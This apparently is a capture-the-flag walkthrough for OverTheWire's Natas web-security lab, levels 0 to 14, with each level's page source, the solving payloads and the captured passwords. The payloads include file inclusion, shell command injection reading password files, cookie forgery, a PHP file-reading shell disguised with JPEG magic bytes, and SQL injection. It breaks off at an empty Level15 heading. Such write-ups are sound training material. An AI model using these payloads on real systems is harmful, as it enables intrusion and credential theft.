http://natasXX.natas.labs.overthewire.org/


## Level00:

``` html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas0", "pass": "natas0" };</script></head>
<body>
<h1>natas0</h1>
<div id="content">
You can find the password for the next level on this page.

<!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->
</div>
</body>
</html>
```

## Level01:

``` html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas1", "pass": "gtVrDuiDfck831PqWsLEZy5gyDz1clto" };</script></head>
<body oncontextmenu="javascript:alert('right clicking has been blocked!');return false;">
<h1>natas1</h1>
<div id="content">
You can find the password for the
next level on this page, but rightclicking has been blocked!

<!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->
</div>
</body>
</html>
```

## Level02:

``` html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas2", "pass": "ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi" };</script></head>
<body>
<h1>natas2</h1>
<div id="content">
There is nothing on this page
<img src="files/pixel.png">
</div>
</body></html>
```
```
We follow the image source above

  http://natas2.natas.labs.overthewire.org/files/pixel.png

we get nothing, then we try

  http://natas2.natas.labs.overthewire.org/files/

and we find the "Index of /files" and a file named users.txt

  http://natas2.natas.labs.overthewire.org/files/users.txt
  # username:password
  alice:BYNdCesZqW
  bob:jw2ueICLvT
  charlie:G5vCxkVV3m
  natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
  eve:zo4mJWyNj2
  mallory:9urtcpzBmH
```

## Level03:

``` html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas3", "pass": "sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14" };</script></head>
<body>
<h1>natas3</h1>
<div id="content">
There is nothing on this page
<!-- No more information leaks!! Not even Google will find it this time... -->
</div>
</body></html>
```
```
We follow the hint we are given

  http://natas3.natas.labs.overthewire.org/robots.txt
  User-agent: *
  Disallow: /s3cr3t/

then we check the folder

  http://natas3.natas.labs.overthewire.org/s3cr3t/

and we find the "Index of /s3cr3t" and a file named users.txt

  http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
  natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
```

## Level04:

```
After opening the link for natas4 we get

  Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"

so we open Tamper Data and we we add the above as a referer

  Referer : http://natas5.natas.labs.overthewire.org/

and then we get the password for the next level

  Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
```

## Level05:

```
After opening the link for natas5 we get the following message

   Access disallowed. You are not logged in

so we open Tamper Data and we se the following

  Host=natas5.natas.labs.overthewire.org
  User-Agent=Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:55.0) Gecko/20100101 Firefox/55.0
  Accept=text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
  Accept-Language=en-US,en;q=0.5
  Accept-Encoding=gzip, deflate
  Cookie=__utma=176859643.1524373413.1499762075.1507916083.1508154737.23; __utmz=176859643.1499762075.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __cfduid=d307f8717c98ae7d6bd6cbaa6eb1df6f41502109006; __utmc=176859643; loggedin=0
  Authorization=Basic bmF0YXM1OmlYNklPZm1wTjdBWU9RR1B3dG4zZlhwYmFKVkpjSGZx
  Connection=keep-alive
  Upgrade-Insecure-Requests=1
  Cache-Control=max-age=0

were loggedin is 0, so we change the value to 1 and we send the request

  Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
```

## Level06:

``` html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas6", "pass": "<censored>" };</script></head>
<body>
<h1>natas6</h1>
<div id="content">

<?

include "includes/secret.inc";

   if(array_key_exists("submit", $_POST)) {
       if($secret == $_POST['secret']) {
       print "Access granted. The password for natas7 is <censored>";
   } else {
       print "Wrong secret";
   }
   }
?>

<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```
```
When we view the source code, we find "includes/secret.inc" and we check the file

  http://natas6.natas.labs.overthewire.org/includes/secret.inc

after viewing the source code we find the secret

  <? $secret = "FOEIUWGHFEEUHOFUOIU"; ?>

we add this to the input and we get

  Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
```

## Level07:

``` html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas7", "pass": "7z3hEENjQtflzgnT29q7wAvMNfZdh0i9" };</script></head>
<body>
<h1>natas7</h1>
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
</body>
</html>
```
```
We can see in the source code of the page the above hint an also the "index.php?page=home", so we try the following

  http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8

and we get the pass word

  DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
```

## Level08:

``` html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas8", "pass": "<censored>" };</script></head>
<body>
<h1>natas8</h1>
<div id="content">

<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
   return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
   if(encodeSecret($_POST['secret']) == $encodedSecret) {
   print "Access granted. The password for natas9 is <censored>";
   } else {
   print "Wrong secret";
   }
}
?>

<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```
```
We can see in the source code of the page, a php function and the secret, so we reverse the function
after running natas8.php and we get the following

  oubWYf2kBq

we add this to the input and we get

  Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
```

## Level09:

``` html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas9", "pass": "<censored>" };</script></head>
<body>
<h1>natas9</h1>
<div id="content">
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
   $key = $_REQUEST["needle"];
}

if($key != "") {
   passthru("grep -i $key dictionary.txt");
}
?>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```
```
We can run our commands to get the password so we give the following input

  ; cat /etc/natas_webpass/natas10;

and we get

  nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
```

## Level10:

``` html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas10", "pass": "<censored>" };</script></head>
<body>
<h1>natas10</h1>
<div id="content">

For security reasons, we now filter on certain characters<br/><br/>
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
   $key = $_REQUEST["needle"];
}

if($key != "") {
   if(preg_match('/[;|&]/',$key)) {
       print "Input contains an illegal character!";
   } else {
       passthru("grep -i $key dictionary.txt");
   }
}
?>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```
```
After looking at the source code, we see that we can't use ; or &, so we use the following

  .* /etc/natas_webpass/natas11 #

and we get the following answer

  .htaccess:AuthType Basic
  .htaccess: AuthName "Authentication required"
  .htaccess: AuthUserFile /var/www/natas/natas10//.htpasswd
  .htaccess: require valid-user
  .htpasswd:natas10:$1$XOXwo/z0$K/6kBzbw4cQ5exEWpW5OV0
  /etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
```

## Level11:

``` html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas11", "pass": "<censored>" };</script></head>
<?

$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
   $key = '<censored>';
   $text = $in;
   $outText = '';

   // Iterate through each character
   for($i=0;$i<strlen($text);$i++) {
     $outText .= $text[$i] ^ $key[$i % strlen($key)];
   }

   return $outText;
}

function loadData($def) {
   global $_COOKIE;
   $mydata = $def;

   if(array_key_exists("data", $_COOKIE)) {
     $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);

     if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
       if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
         $mydata['showpassword'] = $tempdata['showpassword'];
         $mydata['bgcolor'] = $tempdata['bgcolor'];
       }
     }
   }
   return $mydata;
}

function saveData($d) {
   setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
   if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
       $data['bgcolor'] = $_REQUEST['bgcolor'];
   }
}

saveData($data);

?>

<h1>natas11</h1>
<div id="content">
<body style="background: <?=$data['bgcolor']?>;">
Cookies are protected with XOR encryption<br/><br/>

<?
if($data["showpassword"] == "yes") {
   print "The password for natas12 is <censored><br>";
}
?>

<form>
Background color: <input name=bgcolor value="<?=$data['bgcolor']?>">
<input type=submit value="Set color">
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```
```
We get the cookie and we add it to natas11.php in order to reverse it and find the key
after finding the key, we encode the {"showpassword":"yes","bgcolor":"#ffffff"} so that
we can add it to the http request with tamper data and get the password

  The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
```

## Level12:

``` html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas12", "pass": "<censored>" };</script></head>
<body>
<h1>natas12</h1>
<div id="content">
<?

function genRandomString() {
   $length = 10;
   $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
   $string = "";    

   for ($p = 0; $p < $length; $p++) {
       $string .= $characters[mt_rand(0, strlen($characters)-1)];
   }

   return $string;
}

function makeRandomPath($dir, $ext) {
   do {
   $path = $dir."/".genRandomString().".".$ext;
   } while(file_exists($path));
   return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
   $ext = pathinfo($fn, PATHINFO_EXTENSION);
   return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
   $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


       if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
       echo "File is too big";
   } else {
       if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
           echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
       } else{
           echo "There was an error uploading the file, please try again!";
       }
   }
} else {
?>

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<? } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```
```
After looking at the source code we figure out that we can upload anything, so we
upload the natas12.php file and we get the following

  The file upload/p4xptpicbs.jpg has been uploaded
  http://natas12.natas.labs.overthewire.org/upload/p4xptpicbs.jpg

and we get an error message, then after looking at the source code again, we find out
that we can change the extension of the file from .jpg to .php from the following
<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" />

  The file upload/3o4c50nxl9.php has been uploaded
  http://natas12.natas.labs.overthewire.org/upload/3o4c50nxl9.php

and then we can see the password for the next level
  jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
```

## Level13:

``` html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas13", "pass": "<censored>" };</script></head>
<body>
<h1>natas13</h1>
<div id="content">
For security reasons, we now only accept image files!<br/><br/>

<?

function genRandomString() {
   $length = 10;
   $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
   $string = "";    

   for ($p = 0; $p < $length; $p++) {
       $string .= $characters[mt_rand(0, strlen($characters)-1)];
   }

   return $string;
}

function makeRandomPath($dir, $ext) {
   do {
     $path = $dir."/".genRandomString().".".$ext;
   } while(file_exists($path));
   return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
   $ext = pathinfo($fn, PATHINFO_EXTENSION);
   return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
   $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


   if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
     echo "File is too big";
   } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
     echo "File is not an image";
   } else {
       if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
           echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
       } else{
           echo "There was an error uploading the file, please try again!";
       }
   }
} else {
?>

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<? } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```
```
After looking at the source code, we can find that it uses the "exif_imagetype" function to check
the extention, after searching for this function we find out that it only reads the first bytes of
an image and checks its signature. So we add the JPEG magic number 0xFFD8FFE0 and upload the file

  echo `printf "\xFF\xD8\xFF\xE0"`'<? passthru("cat /etc/natas_webpass/natas14"); ?>' > natas13.php

and after uploading the file we get

   The file upload/smhi9gxs7a.php has been uploaded
   http://natas13.natas.labs.overthewire.org/upload/smhi9gxs7a.php
   ����Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
```

## Level14:

``` html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas14", "pass": "<censored>" };</script></head>
<body>
<h1>natas14</h1>
<div id="content">
<?
if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas14', '<censored>');
    mysql_select_db('natas14', $link);

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
      echo "Executing query: $query<br>";
    }

    if(mysql_num_rows(mysql_query($query, $link)) > 0) {
      echo "Successful login! The password for natas15 is <censored><br>";
    } else {
      echo "Access denied!<br>";
    }
    mysql_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password"><br>
<input type="submit" value="Login" />
</form>
<? } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```
```
After looking at the source code we see that we can use sql injection, so we add to the input

  username : " or 1=1; -- (with a space at the end)
  password : 123

and after hitting submit we get

  Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
```

## Level15:
